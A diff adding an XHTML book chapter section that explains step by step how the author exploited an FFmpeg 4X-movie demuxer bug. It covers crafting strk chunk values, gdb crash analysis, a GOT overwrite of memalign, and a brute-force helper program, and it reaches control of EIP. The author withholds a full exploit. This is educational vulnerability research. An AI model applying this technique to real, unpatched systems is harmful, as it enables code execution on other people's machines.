@@ -1,0 +1,382 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head><title>4.2 Exploitation</title><link rel="stylesheet" href="core.css" type="text/css"/><meta name="generator" content="DocBook XSL Stylesheets V1.74.0"/></head><body><div class="sect1" title="4.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id2"/>4.2 Exploitation</h1></div></div></div><p>To exploit the vulnerability I did the following:</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The vulnerability affects all operating system platforms supported by FFmpeg. The platform that I used throughout this chapter was the default installation of Ubuntu Linux 9.04 (32-bit)</em></span>.<a id="IDX-CHP-4-0008" class="indexterm"/></p></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: Find a sample 4X movie file with a valid <code class="literal">strk</code> chunk.</p></li><li class="listitem"><p>Step 2: Learn about the layout of the <code class="literal">strk</code> chunk.</p></li><li class="listitem"><p>Step 3: Manipulate the <code class="literal">strk</code> chunk to crash FFmpeg.</p></li><li class="listitem"><p>Step 4: Manipulate the <code class="literal">strk</code> chunk to get control over <code class="literal">EIP</code>.</p></li></ul></div><p>There are different ways to exploit file format bugs. I could either create a file with the right format from scratch or alter an existing file. I chose the latter approach. I used the website <a class="ulink" href="http://samples.mplayerhq.hu/">http://samples.mplayerhq.hu/</a> to find a 4X movie file suitable for testing this vulnerability. I could have built a file myself, but downloading a preexisting file is fast and easy.</p><div class="sect2" title="Step 1: Find a Sample 4X Movie File with a Valid strk Chunk"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_find_a_sample_4x_movie_file"/>Step 1: Find a Sample 4X Movie File with a Valid strk Chunk</h2></div></div></div><p>I used the following to get a sample file from <a class="ulink" href="http://samples.mplayerhq.hu/">http://samples.mplayerhq.hu/</a>.</p><a id="I_programlisting4_d1e3919"/><pre class="programlisting">linux$ <strong class="userinput"><code>wget -q http://samples.mplayerhq.hu/ga</code></strong>
+<strong class="userinput"><code>me-formats/4xm/</code></strong>
+                     → <strong class="userinput"><code>TimeGatep01s01n01a02_2.4xm</code></strong></pre><p>After downloading the file, I renamed it <span class="emphasis"><em>original.4xm</em></span>.</p></div><div class="sect2" title="Step 2: Learn About the Layout of the strk Chunk"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_learn_about_the_layout_of_t"/>Step 2: Learn About the Layout of the strk Chunk</h2></div></div></div><p>According to the 4X movie file format description, a <code class="literal">strk</code> chunk has the following structure:</p><a id="I_programlisting4_d1e3942"/><pre class="programlisting">bytes 0-3    fourcc: 'strk'
+bytes 4-7    length of strk structure (40 or 0x28 bytes)
+bytes 8-11   track number
+bytes 12-15  audio type: 0 = PCM, 1 = 4X IMA ADPCM
+bytes 16-35  unknown
+bytes 36-39  number of audio channels
+bytes 40-43  audio sample rate
+bytes 44-47  audio sample resolution (8 or 16 bits)</pre><p>The <code class="literal">strk</code> chunk of the downloaded sample file starts at file offset <code class="literal">0x1a6</code>, as shown in <a class="xref" href="ch04s02.html#a_strk_chunk_from_the_4x_movie_sample_fi" title="Figure 4-4. A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in Table 4-1.">Figure 4-4</a>:</p><div class="figure"><a id="a_strk_chunk_from_the_4x_movie_sample_fi"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e3962"/><img src="httpatomoreillycomsourcenostarchimages939269.png.jpg" alt="A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in ."/></div></div><p class="title">Figure 4-4. A <code class="literal">strk</code> chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in <a class="xref" href="ch04s02.html#components_of_strk_chunk_layout_shown_in" title="Table 4-1. Components of strk Chunk Layout Shown in Figure 4-4">Table 4-1</a>.</p></div><p><a class="xref" href="ch04s02.html#components_of_strk_chunk_layout_shown_in" title="Table 4-1. Components of strk Chunk Layout Shown in Figure 4-4">Table 4-1</a> describes the layout of the <code class="literal">strk</code> chunk illustrated in <a class="xref" href="ch04s02.html#a_strk_chunk_from_the_4x_movie_sample_fi" title="Figure 4-4. A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in Table 4-1.">Figure 4-4</a>.</p><div class="table"><a id="components_of_strk_chunk_layout_shown_in"/><p class="title">Table 4-1. Components of strk Chunk Layout Shown in <a class="xref" href="ch04s02.html#a_strk_chunk_from_the_4x_movie_sample_fi" title="Figure 4-4. A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in Table 4-1.">Figure 4-4</a></p><div class="table-contents"><table summary="Components of strk Chunk Layout Shown in " style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Reference</p></th><th style="text-align: left" valign="bottom"><p>Header offset</p></th><th style="text-align: left" valign="bottom"><p>Description</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p>(1)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">fourcc: 'strk'</code></p></td></tr><tr><td style="text-align: left" valign="top"><p>(2)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i+4]</code></p></td><td style="text-align: left" valign="top"><p>length of <code class="literal">strk</code> structure (<code class="literal">0x28</code> bytes)</p></td></tr><tr><td style="text-align: left" valign="top"><p>(3)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i+8]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">track number</code> (this is the <code class="literal">current_track</code> variable from FFmpeg source code)</p></td></tr><tr><td style="text-align: left" valign="top"><p>(4)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i+12]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">audio type</code> (this is the value that gets written at the first dereferenced memory location)</p></td></tr></tbody></table></div></div><p>To exploit this vulnerability, I knew that I would need to set the values of <code class="literal">track number</code> at <code class="literal">&amp;header[i+8]</code> (that corresponds to <code class="literal">current_track</code> from FFmpeg source code) and <code class="literal">audio type</code> at <code class="literal">&amp;header[i+12]</code>. If I set the values properly, the value of <code class="literal">audio type</code> would be written at the memory location <code class="literal">NULL + track number</code>, which is the same as <code class="literal">NULL + current_track</code>.</p><p>In summary, the (nearly) arbitrary memory write operations from the FFmpeg source code are as follows:</p><a id="I_programlisting4_d1e4082"/><pre class="programlisting">[..]
+178       fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);
+179       fourxm-&gt;tracks[current_track].channels = AV_RL32(&amp;header[i + 36]);
+180       fourxm-&gt;tracks[current_track].sample_rate = AV_RL32(&amp;header[i + 40]);
+181       fourxm-&gt;tracks[current_track].bits = AV_RL32(&amp;header[i + 44]);
+[..]</pre><p>And each corresponds to this pseudo code:</p><a id="I_programlisting4_d1e4087"/><pre class="programlisting">NULL[user_controlled_value].offset = user_controlled_data;</pre></div><div class="sect2" title="Step 3: Manipulate the strk Chunk to Crash FFmpeg"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_manipulate_the_strk_chunk_t"/>Step 3: Manipulate the strk Chunk to Crash FFmpeg</h2></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Compiling FFmpeg: linux$ ./configure; make These commands will compile two different binary versions of FFmpeg</em></span>:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p><span class="underline">ffmpeg</span> <span class="emphasis"><em>Binary without debugging symbols</em></span></p></li><li class="listitem"><p><span class="underline">ffmpeg_g</span> <span class="emphasis"><em>Binary with debugging symbols</em></span></p></li></ul></div></div><p>After compiling the vulnerable FFmpeg source code revision 16556, I tried to convert the 4X movie into an AVI file to verify that the compilation was successful and that FFmpeg worked flawlessly.</p><a id="I_programlisting4_d1e4114"/><pre class="programlisting">linux$ <strong class="userinput"><code>./ffmpeg_g -i original.4xm original.avi</code></strong>
+FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
+  configuration:
+  libavutil     49.12. 0 / 49.12. 0
+  libavcodec    52.10. 0 / 52.10. 0
+  libavformat   52.23. 1 / 52.23. 1
+  libavdevice   52. 1. 0 / 52. 1. 0
+  built on Jan 24 2009 02:30:50, gcc: 4.3.3
+Input #0, 4xm, from 'original.4xm':
+  Duration: 00:00:13.20, start: 0.000000, bitrate: 704 kb/s
+    Stream #0.0: Video: 4xm, rgb565, 640x480, 15.00 tb(r)
+    Stream #0.1: Audio: pcm_s16le, 22050 Hz, stereo, s16, 705 kb/s
+Output #0, avi, to 'original.avi':
+    Stream #0.0: Video: mpeg4, yuv420p, 640x480, q=2-31, 200 kb/s, 15.00 tb(c)
+    Stream #0.1: Audio: mp2, 22050 Hz, stereo, s16, 64 kb/s
+Stream mapping:
+  Stream #0.0 -&gt; #0.0
+  Stream #0.1 -&gt; #0.1
+Press [q] to stop encoding
+frame=   47 fps=  0 q=2.3 Lsize=     194kB time=3.08 bitrate= 515.3kbits/s
+video:158kB audio:24kB global headers:0kB muxing overhead 6.715897%</pre><p>Next, I modified the values of <code class="literal">track number</code> as well as <code class="literal">audio type</code> in the <code class="literal">strk</code> chunk of the sample file.</p><p>As illustrated in <a class="xref" href="ch04s02.html#the_strk_chunk_of_the_sample_file_after" title="Figure 4-5. The strk chunk of the sample file after I altered it. The changes I made are highlighted and framed, and the numbers shown are referenced in the text above.">Figure 4-5</a>, I changed the value of <code class="literal">track number</code> to <code class="literal">0xaaaaaaaa</code> (1) and the value of <code class="literal">audio type</code> to <code class="literal">0xbbbbbbbb</code> (2). I named the new file <span class="emphasis"><em>poc1.4xm</em></span> and tried to convert it with FFmpeg (see Section B.4 for a description of the following debugger commands).</p><div class="figure"><a id="the_strk_chunk_of_the_sample_file_after"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4156"/><img src="httpatomoreillycomsourcenostarchimages939271.png.jpg" alt="The strk chunk of the sample file after I altered it. The changes I made are highlighted and framed, and the numbers shown are referenced in the text above."/></div></div><p class="title">Figure 4-5. The <code class="literal">strk</code> chunk of the sample file after I altered it. The changes I made are highlighted and framed, and the numbers shown are referenced in the text above.</p></div><a id="I_programlisting4_d1e4161"/><pre class="programlisting">linux$ <strong class="userinput"><code>gdb ./ffmpeg_g</code></strong>
+GNU gdb 6.8-debian
+Copyright (C) 2008 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu"...
+
+(gdb) <strong class="userinput"><code>set disassembly-flavor intel</code></strong>
+
+(gdb) <strong class="userinput"><code>run -i poc1.4xm</code></strong>
+Starting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc1.4xm
+FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
+  configuration:
+  libavutil     49.12. 0 / 49.12. 0
+  libavcodec    52.10. 0 / 52.10. 0
+  libavformat   52.23. 1 / 52.23. 1
+  libavdevice   52. 1. 0 / 52. 1. 0
+  built on Jan 24 2009 02:30:50, gcc: 4.3.3
+
+<strong class="userinput"><code>Program received signal SIGSEGV, Segmentation fault.</code></strong>
+<strong class="userinput"><code>0x0809c89d in fourxm_read_header (s=0x8913330,</code></strong>
+ <strong class="userinput"><code>ap=0xbf8b6c24) at libavformat/4xm.c:178</code></strong>
+<strong class="userinput"><code>178     fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);</code></strong></pre><p>As expected, FFmpeg crashed with a segmentation fault at source code line 178. I further analyzed the FFmpeg process within the debugger to see what exactly caused the crash.</p><a id="I_programlisting4_d1e4186"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers</code></strong>
+<strong class="userinput"><code>eax            0xbbbbbbbb</code></strong>    −1145324613
+ecx            0x891c400     143770624
+edx            0x0           0
+<strong class="userinput"><code>ebx            0xaaaaaaaa</code></strong>    −1431655766
+esp            0xbf8b6aa0    0xbf8b6aa0
+ebp            0x55555548    0x55555548
+esi            0x891c3c0     143770560
+edi            0x891c340     143770432
+eip            0x809c89d     0x809c89d &lt;fourxm_read_header+509&gt;
+eflags         0x10207       [ CF PF IF RF ]
+cs             0x73          115
+ss             0x7b          123
+ds             0x7b          123
+es             0x7b          123
+fs             0x0           0
+gs             0x33          51</pre><p>At the time of the crash, the registers <code class="literal">EAX</code> and <code class="literal">EBX</code> were filled with the values that I input for <code class="literal">audio type</code> (<code class="literal">0xbbbbbbbb</code>) and <code class="literal">track number</code> (<code class="literal">0xaaaaaaaa</code>). Next, I asked the debugger to display the last instruction executed by FFmpeg:</p><a id="I_programlisting4_d1e4219"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1i $eip</code></strong>
+0x809c89d &lt;fourxm_read_header+509&gt;:    mov    DWORD PTR [edx+ebp*1+0x10],eax</pre><p>As the debugger output shows, the instruction that caused the segmentation fault was attempting to write the value <code class="literal">0xbbbbbbbb</code> at an address calculated using my value for <code class="literal">track number</code>.</p><p>To control the memory write, I needed to know how the destination address of the write operation was calculated. I found the answer by looking at the following assembly code:</p><a id="I_programlisting4_d1e4234"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/7i $eip - 21</code></strong>
+0x809c888 &lt;fourxm_read_header+488&gt;:    lea    ebp,[ebx+ebx*4]
+0x809c88b &lt;fourxm_read_header+491&gt;:    mov    eax,DWORD PTR [esp+0x34]
+0x809c88f &lt;fourxm_read_header+495&gt;:    mov    edx,DWORD PTR [esi+0x10]
+0x809c892 &lt;fourxm_read_header+498&gt;:    mov    DWORD PTR [esp+0x28],ebp
+0x809c896 &lt;fourxm_read_header+502&gt;:    shl    ebp,0x2
+0x809c899 &lt;fourxm_read_header+505&gt;:    mov    eax,DWORD PTR [ecx+eax*1+0xc]
+0x809c89d &lt;fourxm_read_header+509&gt;:    mov    DWORD PTR [edx+ebp*1+0x10],eax</pre><p>These instructions correspond to the following C source line:</p><a id="I_programlisting4_d1e4241"/><pre class="programlisting">[..]
+178       fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);
+[..]</pre><p><a class="xref" href="ch04s02.html#list_of_the_assembler_instructions_and" title="Table 4-2. List of the Assembler Instructions and the Result of Each Instruction">Table 4-2</a> explains the results of these instructions.</p><p>Since <code class="literal">EBX</code> contains the value I supplied for <code class="literal">current_track</code> and <code class="literal">EDX</code> contains the NULL pointer of <code class="literal">fourxm-&gt;tracks</code>, the calculation can be expressed as this:</p><a id="I_programlisting4_d1e4260"/><pre class="programlisting">edx + ((ebx + ebx * 4) &lt;&lt; 2) + 0x10 = destination address of the write operation</pre><div class="table"><a id="list_of_the_assembler_instructions_and"/><p class="title">Table 4-2. List of the Assembler Instructions and the Result of Each Instruction</p><div class="table-contents"><table summary="List of the Assembler Instructions and the Result of Each Instruction" style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Instruction<a id="IDX-CHP-4-0009" class="indexterm"/><a id="IDX-CHP-4-0010" class="indexterm"/><a id="IDX-CHP-4-0011" class="indexterm"/></p></th><th style="text-align: left" valign="bottom"><p>Result</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p><code class="literal">lea ebp,[ebx+ebx*4]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">ebp = ebx + ebx * 4</code> (The <code class="literal">EBX</code> register contains the user-defined value of <code class="literal">current_track</code> (<code class="literal">0xaaaaaaaa</code>).)</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov eax,DWORD PTR [esp+0x34]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">eax</code> = array index <code class="literal">i</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov edx,DWORD PTR [esi+0x10]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">edx = fourxm-&gt;tracks</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">shl ebp,0x2</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">ebp = ebp &lt;&lt; 2</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov eax,DWORD PTR [ecx+eax*1+0xc]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">eax = AV_RL32(&amp;header[i + 12]);</code> or <code class="literal">eax = ecx[eax + 0xc];</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov DWORD PTR [edx+ebp*1+0x10],eax</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">fourxm-&gt;tracks[current_track].adpcm = eax;</code> or <code class="literal">edx[ebp + 0x10] = eax;</code></p></td></tr></tbody></table></div></div><p>Or in a more simplified form:</p><a id="I_programlisting4_d1e4362"/><pre class="programlisting">edx + (ebx * 20) + 0x10 = destination address of the write operation</pre><p>I supplied the value <code class="literal">0xaaaaaaaa</code> for <code class="literal">current_track</code> (<code class="literal">EBX</code> register), so the calculation should look like this:</p><a id="I_programlisting4_d1e4375"/><pre class="programlisting">NULL + (0xaaaaaaaa * 20) + 0x10 = 0x55555558</pre><p>The result of <code class="literal">0x55555558</code> can be confirmed with the help of the debugger:</p><a id="I_programlisting4_d1e4382"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1x $edx+$ebp+0x10</code></strong>
+0x55555558:    Cannot access memory at address 0x55555558</pre></div><div class="sect2" title="Step 4: Manipulate the strk Chunk to Gain Control over EIP"><div class="titlepage"><div><div><h2 class="title"><a id="step_4_colon_manipulate_the_strk_chunk"/>Step 4: Manipulate the strk Chunk to Gain Control over EIP</h2></div></div></div><p>The vulnerability allowed me to overwrite nearly arbitrary memory addresses with any 4-byte value. To gain control of the execution flow of FFmpeg, I had to overwrite a memory location that would allow me to control the <code class="literal">EIP</code> register. I had to find a stable address, one that was predictable within the address space of FFmpeg. That ruled out all stack addresses of the process. But the <span class="emphasis"><em>Executable and Linkable Format</em></span> (<span class="emphasis"><em>ELF</em></span>) used by Linux provides an almost perfect target: the <span class="emphasis"><em>Global Offset Table</em></span> (<span class="emphasis"><em>GOT</em></span>). Every library function used in FFmpeg has a reference in the GOT. By manipulating GOT entries, I could easily gain control of the execution flow (see Section A.4). The good thing about the GOT is that it’s predictable, which is exactly what I needed. I could gain control of <code class="literal">EIP</code> by overwriting the GOT entry of a library function that is called after the vulnerability happens.</p><p>So, what library function is called after the arbitrary memory writes? To answer this question, I had a look at the source code again:</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavformat/4xm.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">fourxm_read_header()</code></p></dd></dl></div><a id="I_programlisting4_d1e4430"/><pre class="programlisting">[..]
+184         /* allocate a new AVStream */
+<strong class="userinput"><code>185         st = av_new_stream(s, current_track);</code></strong>
+[..]</pre><p>Directly after the four memory-write operations, a new <code class="literal">AVStream</code> is allocated using the function <code class="literal">av_new_stream()</code>.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavformat/utils.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">av_new_stream()</code></p></dd></dl></div><a id="I_programlisting4_d1e4460"/><pre class="programlisting">[..]
+<strong class="userinput"><code>2271    AVStream *av_new_stream(AVFormatContext *s, int id)</code></strong>
+2272    {
+2273        AVStream *st;
+2274        int i;
+2275
+2276        if (s-&gt;nb_streams &gt;= MAX_STREAMS)
+2277            return NULL;
+2278
+<strong class="userinput"><code>2279        st = av_mallocz(sizeof(AVStream));</code></strong>
+[..]</pre><p>In line 2279 another function named <code class="literal">av_mallocz()</code> is called.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavutil/mem.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Functions</strong></span></span></dt><dd><p><code class="literal">av_mallocz()</code> and <code class="literal">av_malloc()</code></p></dd></dl></div><a id="I_programlisting4_d1e4493"/><pre class="programlisting">[..]
+<strong class="userinput"><code>43    void *av_malloc(unsigned int size)</code></strong>
+44    {
+45        void *ptr = NULL;
+46    #ifdef CONFIG_MEMALIGN_HACK
+47        long diff;
+48    #endif
+49
+50        /* let's disallow possible ambiguous cases */
+51        if(size &gt; (INT_MAX-16) )
+52            return NULL;
+53
+54    #ifdef CONFIG_MEMALIGN_HACK
+55        ptr = malloc(size+16);
+56        if(!ptr)
+57            return ptr;
+58        diff= ((-(long)ptr - 1)&amp;15) + 1;
+59        ptr = (char*)ptr + diff;
+60        ((char*)ptr)[-1]= diff;
+61    #elif defined (HAVE_POSIX_MEMALIGN)
+62        posix_memalign(&amp;ptr,16,size);
+63    #elif defined (HAVE_MEMALIGN)
+<strong class="userinput"><code>64        ptr = memalign(16,size);</code></strong>
+[..]
+<strong class="userinput"><code>135    void *av_mallocz(unsigned int size)</code></strong>
+136    {
+<strong class="userinput"><code>137        void *ptr = av_malloc(size);</code></strong>
+138        if (ptr)
+139            memset(ptr, 0, size);
+140        return ptr;
+141    }
+[..]</pre><p>In line 137 the function <code class="literal">av_malloc()</code> is called, and it calls <code class="literal">memalign()</code> in line 64 (the other <code class="literal">ifdef</code> cases—lines 54 and 61—are not defined when using the Ubuntu Linux 9.04 platform). I was excited to see <code class="literal">memalign()</code> because it was exactly what I was looking for: a library function that’s called directly after the vulnerability happens (see <a class="xref" href="ch04s02.html#a_call_graph_showing_the_path_from_the_v" title="Figure 4-6. A call graph showing the path from the vulnerable function to memalign()">Figure 4-6</a>).<a id="IDX-CHP-4-0012" class="indexterm"/><a id="IDX-CHP-4-0013" class="indexterm"/></p><div class="figure"><a id="a_call_graph_showing_the_path_from_the_v"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4538"/><img src="httpatomoreillycomsourcenostarchimages939273.png.jpg" alt="A call graph showing the path from the vulnerable function to memalign()"/></div></div><p class="title">Figure 4-6. A call graph showing the path from the vulnerable function to <code class="literal">memalign()</code></p></div><p>That brought me to the next question: What is the address of the GOT entry of <code class="literal">memalign()</code> in FFmpeg?</p><p>I gained this information with the help of <code class="literal">objdump</code>:<a id="IDX-CHP-4-0014" class="indexterm"/></p><a id="I_programlisting4_d1e4556"/><pre class="programlisting">linux$ <strong class="userinput"><code>objdump -R ffmpeg_g | grep memalign</code></strong>
+08560204 R_386_JUMP_SLOT   posix_memalign</pre><p>So the address I had to overwrite was <code class="literal">0x08560204</code>. All I had to do was calculate an appropriate value for <code class="literal">track number</code> (<code class="literal">current_track</code>). I could get that value in either of two ways: I could try to calculate it, or I could use brute force. I chose the easy option and wrote the following program:</p><div class="example"><a id="little_helper_program_to"/><p class="title">Example 4-1. Little helper program to use brute force to find the appropriate value for <code class="literal">current_track</code> (<span class="emphasis"><em>addr_brute_force.c</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #include &lt;stdio.h&gt;
+02
+03    // GOT entry address of memalign()
+04    #define MEMALIGN_GOT_ADDR       0x08560204
+05
+06    // Min and max value for 'current_track'
+07    #define SEARCH_START            0x80000000
+08    #define SEARCH_END              0xFFFFFFFF
+09
+10    int
+11    main (void)
+12    {
+13           unsigned int  a, b    = 0;
+14
+15           for (a = SEARCH_START; a &lt; SEARCH_END; a++) {
+16                   b = (a * 20) + 0x10;
+17                   if (b == MEMALIGN_GOT_ADDR) {
+18                         printf ("Value for 'current_track': %08x\n", a);
+19                         return 0;
+20                   }
+21           }
+22
+23           printf ("No valid value for 'current_track' found.\n");
+24
+25           return 1;
+26    }</pre></div></div><p>The program illustrated in <a class="xref" href="ch04s02.html#little_helper_program_to" title="Example 4-1. Little helper program to use brute force to find the appropriate value for current_track (addr_brute_force.c)">Example 4-1</a> uses brute force to find an appropriate <code class="literal">track number</code> (<code class="literal">current_track</code>) value, which is needed to overwrite the (GOT) address defined in line 4. This is done by trying all possible values for <code class="literal">current_track</code> until the result of the calculation (see line 16) matches the searched GOT entry address of <code class="literal">memalign()</code> (see line 17). To trigger the vulnerability, <code class="literal">current_track</code> has to be interpreted as negative, so only values in the range of <code class="literal">0x80000000</code> to <code class="literal">0xffffffff</code> are considered (see line 15).</p><p>Example:</p><a id="I_programlisting4_d1e4611"/><pre class="programlisting">linux$ <strong class="userinput"><code>gcc -o addr_brute_force addr_brute_force.c</code></strong>
+linux$ <strong class="userinput"><code>./addr_brute_force</code></strong>
+Value for 'current_track': 8d378019</pre><p>I then adjusted the sample file and renamed it <span class="emphasis"><em>poc2.4xm</em></span>.</p><p>The only thing I changed was the value of <code class="literal">track number</code> (see (1) in <a class="xref" href="ch04s02.html#the_strk_chunk_of_poc2.4xm_after_i_adjus" title="Figure 4-7. The strk chunk of poc2.4xm after I adjusted the track number (current_track)">Figure 4-7</a>). It now matched the value generated by my little helper program.</p><div class="figure"><a id="the_strk_chunk_of_poc2.4xm_after_i_adjus"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4647"/><img src="httpatomoreillycomsourcenostarchimages939275.png.jpg" alt="The strk chunk of poc2.4xm after I adjusted the track number (current_track)"/></div></div><p class="title">Figure 4-7. The <code class="literal">strk</code> chunk of <span class="emphasis"><em>poc2.4xm</em></span> after I adjusted the <code class="literal">track number</code> (<code class="literal">current_track</code>)</p></div><p>I then tested the new proof-of-concept file in the debugger (see Section B.4 for a description of the following debugger commands).</p><a id="I_programlisting4_d1e4654"/><pre class="programlisting">linux$ <strong class="userinput"><code>gdb -q ./ffmpeg_g</code></strong>
+
+(gdb) <strong class="userinput"><code>run -i poc2.4xm</code></strong>
+Starting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc2.4xm
+FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
+  configuration:
+  libavutil     49.12. 0 / 49.12. 0
+  libavcodec    52.10. 0 / 52.10. 0
+  libavformat   52.23. 1 / 52.23. 1
+  libavdevice   52. 1. 0 / 52. 1. 0
+  built on Jan 24 2009 02:30:50, gcc: 4.3.3
+
+Program received signal SIGSEGV, Segmentation fault.
+<strong class="userinput"><code>0xbbbbbbbb in ?? ()</code></strong>
+
+(gdb) <strong class="userinput"><code>info registers</code></strong>
+eax            0xbfc1ddd0    −1077813808
+ecx            0x9f69400     167154688
+edx            0x9f60330     167117616
+ebx            0x0           0
+esp            0xbfc1ddac    0xbfc1ddac
+ebp            0x85601f4     0x85601f4
+esi            0x164         356
+edi            0x9f60330     167117616
+<strong class="userinput"><code>eip            0xbbbbbbbb    0xbbbbbbbb</code></strong>
+eflags         0x10293       [ CF AF SF IF RF ]
+cs             0x73          115
+ss             0x7b          123
+ds             0x7b          123
+es             0x7b          123
+fs             0x0           0
+gs             0x33          51</pre><p>Bingo! Full control over <code class="literal">EIP</code>. After I gained control over the instruction pointer, I developed an exploit for the vulnerability. I used the VLC media player as an injection vector, because it uses the vulnerable version of FFmpeg.<a id="IDX-CHP-4-0015" class="indexterm"/><a id="IDX-CHP-4-0016" class="indexterm"/></p><p>As I’ve said in previous chapters, the laws in Germany do not allow me to provide a full working exploit, but you can watch a short video I recorded that shows the exploit in action on the book’s website.<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-5" class="footnoteref">41</a>]</sup></p><p><a class="xref" href="ch04s02.html#diagram_of_my_exploitation_of_the_ffmpeg" title="Figure 4-8. Diagram of my exploitation of the FFmpeg bug">Figure 4-8</a> summarizes the steps I used to exploit the vulnerability. Here is the anatomy of the bug shown in this figure:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>The destination address for the memory write is calculated while using <code class="literal">current_track</code> as an index (<code class="literal">NULL</code> + <code class="literal">current_track</code> + offset). The value of <code class="literal">current_track</code> derives from user-controlled data of the 4xm media file.</p></li><li class="listitem"><p>The source data of the memory write derives from user-controlled data of the media file.</p></li><li class="listitem"><p>The user-controlled data is copied at the memory location of the <code class="literal">memalign()</code> GOT entry.</p></li></ol></div><div class="figure"><a id="diagram_of_my_exploitation_of_the_ffmpeg"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4718"/><img src="httpatomoreillycomsourcenostarchimages939277.png.jpg" alt="Diagram of my exploitation of the FFmpeg bug"/></div></div><p class="title">Figure 4-8. Diagram of my exploitation of the FFmpeg bug</p></div></div></div></body></html>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
